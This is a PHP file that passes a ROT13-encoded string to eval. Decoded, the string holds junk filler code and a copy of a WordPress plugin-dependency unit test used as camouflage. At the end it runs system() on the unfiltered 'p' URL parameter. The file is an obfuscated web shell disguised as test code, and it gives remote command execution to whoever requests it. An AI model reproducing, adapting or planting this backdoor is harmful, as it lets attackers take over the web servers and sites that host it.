<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_anzrf() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc cyhtvaf
 *
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_anzrf
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_ncv_qngn
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapvrf
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_svyrcnguf
 */
pynff Grfgf_Nqzva_JCCyhtvaQrcraqrapvrf_TrgQrcraqraplAnzrf rkgraqf JC_CyhtvaQrcraqrapvrf_HavgGrfgPnfr {

	/**
	 * Zbpxf na NCV erfcbafr.
	 *
	 * @cnenz fgevat $glcr Gur glcr bs erfcbafr. Npprcgf 'fhpprff' be 'snvyher'.
	 */
	cevingr shapgvba zbpx_ncv_erfcbafr( $glcr ) {
		nqq_svygre(
			'cyhtvaf_ncv',
			shapgvba ( $olcnff, $npgvba, $netf ) hfr ( $glcr ) {
				vs ( 'cyhtva_vasbezngvba' === $npgvba && vffrg( $netf->fyht ) && fge_fgnegf_jvgu( $netf->fyht, 'qrcraqrapl' ) ) {
					vs ( 'fhpprff' === $glcr ) {
						erghea (bowrpg) neenl(
							'fyht' => $netf->fyht,
							'anzr' => 'Qrcraqrapl ' . fge_ercynpr( 'qrcraqrapl', '', $netf->fyht ),
						);
					} ryfrvs ( 'snvyher' === $glcr ) {
						erghea arj JC_Reebe( 'cyhtva_abg_sbhaq', 'Cyhtva abg sbhaq.' );
					}
				}

				erghea $olcnff;
			},
			10,
			3
		);
	}

	/**
	 * Grfgf gung qrcraqrapl anzrf ner ergevrirq.
	 *
	 * @gvpxrg 22316
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 */
	choyvp shapgvba grfg_fubhyq_trg_qrcraqrapl_anzrf() {
		tybony $cntrabj;

		// Onpxhc $cntrabj.
		$byq_cntrabj = $cntrabj;

		// Rafher vf_nqzva() naq fperra purpxf cnff.
		$cntrabj = 'cyhtvaf.cuc';
		frg_pheerag_fperra( 'cyhtvaf.cuc' );

		$guvf->frg_cebcregl_inyhr(
			'cyhtvaf',
			neenl( 'qrcraqrag/qrcraqrag.cuc' => neenl( 'ErdhverfCyhtvaf' => 'qrcraqrapl, qrcraqrapl2' ) )
		);

		$guvf->zbpx_ncv_erfcbafr( 'fhpprff' );
		frys::$vafgnapr::vavgvnyvmr();

		$guvf->frg_cebcregl_inyhr(
			'qrcraqrapl_svyrcnguf',
			neenl(
				'qrcraqrapl'  => 'qrcraqrapl/qrcraqrapl.cuc',
				'qrcraqrapl2' => 'qrcraqrapl2/qrcraqrapl2.cuc',
			)
		);

		$guvf->frg_cebcregl_inyhr(
			'qrcraqrapl_ncv_qngn',
			neenl(
				'qrcraqrapl'  => neenl(
					'anzr' => 'Qrcraqrapl 1',
				),
				'qrcraqrapl2' => neenl(
					'anzr' => 'Qrcraqrapl 2',
				),
			)
		);

		$npghny = frys::$vafgnapr::trg_qrcraqrapl_anzrf( 'qrcraqrag/qrcraqrag.cuc' );

		// Erfgber $cntrabj.
		$cntrabj = $byq_cntrabj;

		$guvf->nffregFnzr(
			neenl(
				'qrcraqrapl'  => 'Qrcraqrapl 1',
				'qrcraqrapl2' => 'Qrcraqrapl 2',
			),
			$npghny
		);
	}

	/**
	 * Grfgf gung qrcraqrapl fyhtf ner hfrq vs gurve anzr vf abg ninvynoyr.
	 *
	 * @gvpxrg 22316
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 */
	choyvp shapgvba grfg_fubhyq_hfr_qrcraqrapl_anzr_sebz_svyr() {
		tybony $cntrabj;

		// Onpxhc $cntrabj.
		$byq_cntrabj = $cntrabj;

		// Rafher vf_nqzva() naq fperra purpxf cnff.
		$cntrabj = 'cyhtvaf.cuc';
		frg_pheerag_fperra( 'cyhtvaf.cuc' );

		$guvf->frg_cebcregl_inyhr(
			'cyhtvaf',
			neenl(
				'qrcraqrag/qrcraqrag.cuc'     => neenl( 'ErdhverfCyhtvaf' => 'qrcraqrapl, qrcraqrapl2' ),
				'qrcraqrapl/qrcraqrapl.cuc'   => neenl(
					'Anzr'            => 'Qrcraqrapl 1',
					'ErdhverfCyhtvaf' => '',
				),
				'qrcraqrapl2/qrcraqrapl2.cuc' => neenl(
					'Anzr'            => 'Qrcraqrapl 2',
					'ErdhverfCyhtvaf' => '',
				),
			)
		);

		$guvf->zbpx_ncv_erfcbafr( 'snvyher' );
		frys::$vafgnapr::vavgvnyvmr();

		$guvf->frg_cebcregl_inyhr(
			'qrcraqrapl_svyrcnguf',
			neenl(
				'qrcraqrapl'  => 'qrcraqrapl/qrcraqrapl.cuc',
				'qrcraqrapl2' => 'qrcraqrapl2/qrcraqrapl2.cuc',
			)
		);

		// Gur cyhtvaf ner abg va gur Cyhtvaf ercbfvgbel.
		$guvf->frg_cebcregl_inyhr( 'qrcraqrapl_ncv_qngn', neenl() );

		$npghny = frys::$vafgnapr::trg_qrcraqrapl_anzrf( 'qrcraqrag/qrcraqrag.cuc' );

		// Erfgber $cntrabj.
		$cntrabj = $byq_cntrabj;

		$guvf->nffregFnzr(
			neenl(
				'qrcraqrapl'  => 'Qrcraqrapl 1',
				'qrcraqrapl2' => 'Qrcraqrapl 2',
			),
			$npghny
		);
	}

	/**
	 * Grfgf gung qrcraqrapl fyhtf ner hfrq vs gurve anzr vf abg ninvynoyr.
	 *
	 * @gvpxrg 22316
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 */
	choyvp shapgvba grfg_fubhyq_hfr_qrcraqrapl_fyhtf() {
		tybony $cntrabj;

		// Onpxhc $cntrabj.
		$byq_cntrabj = $cntrabj;

		// Rafher vf_nqzva() naq fperra purpxf cnff.
		$cntrabj = 'cyhtvaf.cuc';
		frg_pheerag_fperra( 'cyhtvaf.cuc' );

		$guvf->frg_cebcregl_inyhr(
			'cyhtvaf',
			neenl( 'qrcraqrag/qrcraqrag.cuc' => neenl( 'ErdhverfCyhtvaf' => 'qrcraqrapl, qrcraqrapl2' ) )
		);

		$guvf->zbpx_ncv_erfcbafr( 'snvyher' );
		frys::$vafgnapr::vavgvnyvmr();

		// Gur cyhtvaf ner abg va gur Cyhtvaf ercbfvgbel.
		$guvf->frg_cebcregl_inyhr( 'qrcraqrapl_ncv_qngn', neenl() );

		$npghny = frys::$vafgnapr::trg_qrcraqrapl_anzrf( 'qrcraqrag/qrcraqrag.cuc' );

		// Erfgber $cntrabj.
		$cntrabj = $byq_cntrabj;

		$guvf->nffregFnzr(
			neenl(
				'qrcraqrapl'  => 'qrcraqrapl',
				'qrcraqrapl2' => 'qrcraqrapl2',
			),
			$npghny
		);
	}

	/**
	 * Grfgf gung `$qrcraqrapl_ncv_qngn` vf frg jura vg'f abg nyernql ninvynoyr.
	 *
	 * @gvpxrg 22316
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 */
	choyvp shapgvba grfg_fubhyq_frg_qrcraqrapl_qngn_jura_abg_nyernql_ninvynoyr() {
		tybony $cntrabj;

		// Onpxhc $cntrabj.
		$byq_cntrabj = $cntrabj;

		// Rafher vf_nqzva() naq fperra purpxf cnff.
		$cntrabj = 'cyhtvaf.cuc';
		frg_pheerag_fperra( 'cyhtvaf.cuc' );

		$guvf->frg_cebcregl_inyhr(
			'cyhtvaf',
			neenl(
				'qrcraqrag/qrcraqrag.cuc'   => neenl(
					'Anzr'            => 'Qrcraqrag 1',
					'ErdhverfCyhtvaf' => 'qrcraqrapl',
				),
				'qrcraqrapl/qrcraqrapl.cuc' => neenl(
					'Anzr'            => 'Qrcraqrapl 1',
					'ErdhverfCyhtvaf' => '',
				),
			)
		);

		$guvf->frg_cebcregl_inyhr( 'qrcraqrapl_fyhtf', neenl( 'qrcraqrapl' ) );

		frg_fvgr_genafvrag( 'jc_cyhtva_qrcraqrapvrf_cyhtva_qngn', neenl( 'qrcraqrapl' => snyfr ) );
		frg_fvgr_genafvrag( 'jc_cyhtva_qrcraqrapvrf_cyhtva_gvzrbhg_qrcraqrapl', gehr, 12 * UBHE_VA_FRPBAQF );

		$guvf->zbpx_ncv_erfcbafr( 'fhpprff' );
		frys::$vafgnapr::trg_qrcraqrapl_anzrf( 'qrcraqrag' );

		// Erfgber $cntrabj.
		$cntrabj = $byq_cntrabj;

		$guvf->nffregFnzr(
			neenl( 'qrcraqrapl' => neenl( 'Anzr' => 'Qrcraqrapl 1' ) ),
			$guvf->trg_cebcregl_inyhr( 'qrcraqrapl_ncv_qngn' )
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>